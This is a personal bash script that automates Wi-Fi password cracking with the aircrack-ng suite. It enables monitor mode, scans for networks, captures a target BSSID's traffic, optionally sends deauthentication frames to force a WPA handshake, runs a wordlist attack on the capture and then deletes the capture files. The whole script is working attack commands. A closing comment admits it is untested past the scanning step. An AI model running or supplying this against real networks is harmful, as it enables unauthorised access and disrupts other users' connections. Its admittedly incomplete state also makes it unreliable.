#! /bin/bash

# enabling job control.
set -m

# This script is to automate the airmon-ng wifi cracking tool.


# Killing any processes that would interfer with the tool.
sudo airmon-ng check kill


# Displaying the interfaces available.
iwconfig > interfaces
cat interfaces
echo " "


# Taking the interface as input from the user.
echo "Enter the interface : "
read interface
echo $interface
echo " "


# Enabling monitor mode on interface.
echo "Putting interface in monitor mode."
sudo airmon-ng start $interface
newinterface="$interface"'mon'
echo $newinterface
echo " "


# Scanning for Wi-Fi networks.
echo "Scanning for Wi-Fi networks."
sudo airodump-ng $newinterface 
networkscan=$newinterface
echo " "
echo $newinterface
echo " "


# Monitoring the target Network.
echo "Monitoring the target Network."
echo "Please enter the channel : "
read channel
echo "Please enter the bssid : "
read bssid
sudo airodump-ng -w test -c $channel --bssid $bssid $newinterface
echo " "


# Asking if deauth is neccesary.
echo "Is a deauth still neccessary? (eapol in notes). "
echo "y | n (case sensitive)"
read anwser

if [[ $anwser == "y" ]]; then
  # Performing deauth.
  echo " "
  echo "Performing deauthentication."
  echo " "
  sudo aireplay-ng --deauth 25 -a $bssid $newinterface
  echo " "
fi

# Capturing handshake.
echo ' '
cd /home/brian/Desktop/scripts


# Cracking pswrd.
sudo aircrack-ng test-01.cap -w /usr/share/wordlists/wifite.txt | cat > pswrd_process
cat /home/brian/Desktop/scripts/pswrd_process

cd /home/brian/Desktop/scripts/

# Deleting used files.
rm /home/brian/Desktop/scripts/test-01.cap
rm /home/brian/Desktop/scripts/test-01.csv
rm /home/brian/Desktop/scripts/test-01.kismet.csv
rm /home/brian/Desktop/scripts/test-01.kismet.netxml
rm /home/brian/Desktop/scripts/test-01.log.csv
rm /home/brian/Desktop/scripts/interfaces
rm /home/brian/Desktop/scripts/pswrd*

# Stopping monitor mode.
sudo airmon-ng stop $newinterface

exit

# NOT SURE IF THIS WILL WORK, IF NOT THEN FURTHER BASH KNOWLEDGE IS NEEDED!!!!
# SCRPIT WORKS UNTIL SCANNING FOR Wi-Fi NETWORKS...
